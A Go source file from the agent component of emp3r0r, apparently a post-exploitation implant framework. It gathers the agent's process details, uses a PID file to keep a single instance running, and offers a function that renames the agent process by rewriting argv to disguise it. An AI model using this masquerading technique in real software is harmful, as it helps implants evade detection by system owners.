package agent

import (
	"log"
	"os"
	"strconv"

	"github.com/jm33-m0/emp3r0r/core/internal/emp3r0r_def"
	"github.com/jm33-m0/emp3r0r/core/internal/util"
)

// CheckAgentProcess fill up info.emp3r0r_def.AgentProcess
func CheckAgentProcess() *emp3r0r_def.AgentProcess {
	p := &emp3r0r_def.AgentProcess{}
	p.PID = os.Getpid()
	p.PPID = os.Getppid()
	p.Cmdline = util.ProcCmdline(p.PID)
	p.Parent = util.ProcCmdline(p.PPID)

	return p
}

// IsAgentRunningPID is there any emp3r0r agent already running?
func IsAgentRunningPID() (bool, int) {
	defer func() {
		myPIDText := strconv.Itoa(os.Getpid())
		if err := os.WriteFile(RuntimeConfig.PIDFile, []byte(myPIDText), 0o600); err != nil {
			log.Printf("write RuntimeConfig.PIDFile: %v", err)
		}
	}()

	pidBytes, err := os.ReadFile(RuntimeConfig.PIDFile)
	if err != nil {
		return false, -1
	}
	pid, err := strconv.Atoi(string(pidBytes))
	if err != nil {
		return false, -1
	}

	_, err = os.FindProcess(pid)
	return err == nil, pid
}

// SetProcessName rename agent process by modifying its argv, all cmdline args are dropped
func SetProcessName(name string) {
	crossPlatformSetProcName(name)
}
